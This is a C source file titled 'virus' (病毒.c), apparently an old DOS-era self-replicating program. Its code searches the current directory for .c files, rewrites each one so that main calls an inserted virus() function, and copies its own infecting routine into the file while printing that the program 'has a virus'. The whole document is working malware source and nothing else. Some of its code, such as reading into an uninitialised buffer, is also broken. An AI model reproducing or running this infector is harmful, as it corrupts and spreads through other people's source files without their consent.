/*************************************************************************
 > File Name: 病毒.c
 > Author: zhengziqiang
 > Mail: 1174986943@qq.com 
 > Created Time: 2016年05月26日 星期四 23时22分44秒
 ************************************************************************/

#include <stdio.h>
#include <dir.h>
void main(void)
{
virus();
}
int virus()
{
struct ffblk ffblk;
FILE *in,*out,*read;
char *virus="virus.c";
char buf[50][80];
char *p;
char *end="return";
char *bracket="}";
char *main="main";
char *include[2]={"stdio.h","dir.h"};
char *int_virus="int virus()";
char *buffer;
int done,i,j=0,flag=0;
printf("\nI have a virus. Writen by PuBin\n");
done = findfirst("*.c",&ffblk,0);
while (!done)
{
i=0;
if ((in = fopen(ffblk.ff_name, "rt"))== NULL)
{
goto next;
}
do{
if(i>=50)
{
fclose(in);
goto next;
}
p=fgets(buf[i],80,in);
i++;
}while(p!=NULL);
fclose(in);
out=fopen(ffblk.ff_name,"w+t");
fputs("#include<stdio.h>\n",out);
fputs("#include<dir.h>\n",out);
do
{
if(strstr(buf[j],main)!=NULL)
{
for(;j<i-1;j++)
if(strstr(buf[j],end)==NULL&&strstr(buf[j],bracket)==NULL)
fputs(buf[j],out);
else
{
if(flag==0)
{
flag=1;
fputs("virus();\n",out);
}
fputs(buf[j],out);
}
}
else if((strstr(buf[j],include[0])==NULL)
&&(strstr(buf[j],include[1])==NULL))
{
fputs(buf[j],out);
j++;
}
else
j++;
}while(j<i-1);
read=fopen(virus,"rt");
do
{
p=fgets(buffer,80,read);
if(strstr(buffer,int_virus))
while(p!=NULL)
{
if(strstr(buffer,virus)==NULL)
fputs(buffer,out);
else
{
fputs(" char *virus=\"",out);
fputs(ffblk.ff_name,out);
fputs("\";\n",out);
}
p=fgets(buffer,80,read);
}
}while(p!=NULL);
fclose(read);
fclose(out);
printf("\nYour c program  %s has a virus. Writen by PuBin\n",ffblk.ff_name);
next: done = findnext(&ffblk);
}
return 0;
}
